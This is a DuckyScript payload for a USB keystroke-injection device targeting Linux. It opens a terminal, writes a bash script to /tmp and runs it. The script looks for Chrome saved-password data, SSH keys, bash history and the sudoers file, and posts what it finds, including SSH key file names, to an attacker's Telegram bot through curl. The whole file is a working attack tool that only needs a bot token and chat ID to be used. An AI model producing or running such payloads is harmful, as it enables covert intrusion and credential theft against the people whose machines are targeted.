REM Description: Harvests passwords from various sources and sends to Telegram
REM Target: Linux
REM Category: Authentication
REM Type: Configuration Needed

REM *SETUP*
REM Replace TELEGRAM_BOT_TOKEN with your Telegram Bot Token
REM Replace TELEGRAM_CHAT_ID with your Telegram Chat ID

REM Open Terminal
DELAY 2000
GUI SPACE
DELAY 1000
STRING Terminal
ENTER
DELAY 3000

REM Create password harvester
STRING cat > /tmp/password_harvester.sh << 'EOF'
#!/bin/bash
BOT_TOKEN="TELEGRAM_BOT_TOKEN"
CHAT_ID="TELEGRAM_CHAT_ID"

# Function to send to Telegram
send_telegram() {
    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" -d chat_id="${CHAT_ID}" -d text="$1"
}

# Harvest passwords from various sources
send_telegram "🔐 Password Harvesting Started"

# Browser passwords (Chrome)
if [ -f ~/.config/google-chrome/Default/Login\ Data ]; then
    send_telegram "Chrome passwords found"
fi

# SSH keys
if [ -d ~/.ssh ]; then
    send_telegram "SSH keys found: $(ls ~/.ssh/)"
fi

# History files
if [ -f ~/.bash_history ]; then
    send_telegram "Bash history found"
fi

# Sudoers file
if [ -f /etc/sudoers ]; then
    send_telegram "Sudoers file accessible"
fi

send_telegram "✅ Password harvesting completed"
EOF
ENTER
DELAY 2000

STRING chmod +x /tmp/password_harvester.sh
ENTER
DELAY 1000

STRING /tmp/password_harvester.sh
ENTER
DELAY 2000
